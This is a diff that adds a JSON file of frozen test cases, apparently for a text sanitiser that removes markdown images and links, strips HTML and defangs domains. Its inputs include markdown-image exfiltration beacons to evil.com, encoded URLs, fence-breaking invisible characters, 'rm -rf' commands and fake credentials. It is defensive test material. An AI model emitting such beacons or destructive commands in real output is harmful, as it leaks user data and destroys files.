@@ -1,0 +1,24 @@
+{
+ "base": "2742c1bfe510bfb13cfac5d3424bac3d8d6324c5",
+ "count": 18,
+ "frozen": {
+  "<b>head</b>\nhost <IPV4_1> line\nnext <SECRET_2> password%<i> </i>3Dxyz9abc end": "head\nhost <IPV4_1> line\nnext <SECRET_2> password% 3Dxyz9abc end",
+  "```\n![x](https://evil.com/p.png?d=S)\n```": "```\n![x](https://evil.com/p.png?d=S)\n```",
+  "```\ncode\n\u200e```\nafter ![x](https://evil.com/p.png)": "`\u200b`\u200b`\ncode\n`\u200b`\u200b`\nafter [image removed]",
+  "a\r![x](https://evil.com/p.png)": "a\n[image removed]",
+  "a &#123; b": "a &amp;#123; b",
+  "a &#\u0661\u0662\u0663; b": "a &#\u0661\u0662\u0663; b",
+  "a b c 1 2 3 words": "a b c 1 2 3 words",
+  "a&#10;## b&#10;&#96;&#96;&#96;&#10;rm -rf /&#10;&#96;&#96;&#96;": "a&amp;#10;## b&amp;#10;&amp;#96;&amp;#96;&amp;#96;&amp;#10;rm -rf /&amp;#10;&amp;#96;&amp;#96;&amp;#96;",
+  "api_key=AAAA7777 and password%<i> </i>3Dhunter2 end": "api_key=AAAA7777 and password% 3Dhunter2 end",
+  "api_key=AAAAAAAA1234 and password%<i> </i>3Dhunter2 end": "api_key=AAAAAAAA1234 and password% 3Dhunter2 end",
+  "error at `handler.py:42` in `ghcr.io/org/app:1`": "error at `handler.py:42` in `ghcr.io/org/app:1`",
+  "host <IPV4_1> and 10.0.0.9": "host <IPV4_1> and 10.0.0.9",
+  "host <IPV4_1> down <b>x</b>": "host <IPV4_1> down x",
+  "see //evil%2Ecom/p.png?d=S now": "see [link removed] now",
+  "see [a](<IPV4_1>) and 10.0.0.9 and [b](10.0.0.9)": "see a [link removed] and 10.0.0.9 and b [link removed]",
+  "see evil.com and `x`": "see evil[.]com and `x`",
+  "then rm -rf /var/lib now": "then rm -rf /var/lib now",
+  "~~~\n<img src=x>\n~~~": "~~~\n\n~~~"
+ }
+}
